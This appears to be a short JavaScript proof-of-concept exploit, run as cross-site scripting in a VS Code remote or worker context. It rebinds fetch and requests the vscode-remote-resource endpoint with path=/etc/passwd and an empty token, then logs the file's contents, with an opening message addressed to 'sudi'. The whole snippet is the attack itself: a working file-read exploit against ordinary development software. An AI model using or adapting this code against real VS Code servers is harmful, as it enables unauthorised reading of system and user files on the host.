console.dir("Shirley: Hey sudi, I love you , here is your XSS in " + origin)
globalThis.fetch = WorkerGlobalScope.prototype.fetch.bind(globalThis)

async function exploit() {
    const page_resp = await fetch("/stable-d7a2b4936af1bfd80cb96f2567af68badc2325e3/vscode-remote-resource?path=/etc/passwd&tkn=")
    const text = await page_resp.text()
    console.dir(text)
    }
exploit()
